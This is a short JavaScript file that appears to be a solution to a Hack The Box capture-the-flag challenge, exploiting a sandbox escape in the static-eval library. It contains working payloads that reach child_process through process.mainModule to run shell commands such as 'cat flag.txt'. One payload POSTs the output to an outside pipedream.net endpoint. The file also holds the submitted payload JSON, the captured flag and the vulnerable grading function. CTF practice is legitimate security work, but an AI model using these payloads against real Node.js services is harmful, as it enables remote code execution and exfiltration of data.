const evaluate = require('static-eval');
const parse = require('esprima').parse;

//var src ='(function({x}){return x.constructor})({x:"".sub})("console.log(process.env)")()'
var src = '(function({x}){return x.constructor})({x:"".sub})("console.log(global.process.mainModule.constructor._load(\"child_process\").execSync(\"id\").toString())")()'
src = "(function(x) {return `${eval(\"fetch('https://eowrn5qa974f5at.m.pipedream.net', {method: 'POST', body: JSON.stringify({message: global.process.mainModule.constructor._load('child_process').execSync('cat flag.txt').toString()})})\")}`;})()";
let ast = parse(src).body[0].expression
let weight = evaluate(ast, {})
console.log(ast)
console.log(weight)

/*
 * Payload:
 * {"name":"Kenny Bakr",
 *  "formula":"(function(x){return `${eval(\"throw new TypeError(global.process.mainModule.constructor._load('child_process').execSync('cat flagKntmG').toString())\")}`})()"
 * }
 */


// Flag: HTB{f33l1ng_4_l1ttl3_blu3_0r_m4yb3_p1nk?...you_n33d_to_b3h4v&#39;eval!!}

const hasPassed = ({ exam, paper, assignment }, formula) => {

    console.log(exam, paper, assignment)
    let ast = parse(formula).body[0].expression;
    let weight = evaluate(ast, { exam, paper, assignment });
    console.log(weight)
    return parseFloat(weight) >= parseFloat(10.5);
}

// instead of console.log, maybe I need to send a message back to some fake address with the flag




